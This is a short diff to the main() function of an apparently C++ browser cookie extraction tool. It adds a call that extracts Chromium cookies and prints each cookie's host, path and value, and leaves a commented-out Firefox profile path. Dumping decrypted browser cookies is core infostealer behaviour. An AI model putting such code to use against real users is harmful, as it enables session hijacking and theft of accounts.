@@ -21,11 +21,17 @@ int main()
         firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
         */
 #endif
-        ChromiumProcessor cProc1;
+        ChromiumProcessor chrProc1;
 
-        cProc1.getMasterKey();
+        chrProc1.ExtractChromiumCookies();
 
-        cProc1.getChromiumCookies();
+        for(unsigned long int i=0; i<chrProc1.Cookies->size(); i++)
+        {
+            cout<<chrProc1.Cookies->at(i).Host<<"|";
+            cout<<chrProc1.Cookies->at(i).Path<<"|";
+            cout<<chrProc1.Cookies->at(i).Value<<"\n";
+        }
+
 /*
         if(experimental::filesystem::exists(firefox_pass_path))
         {
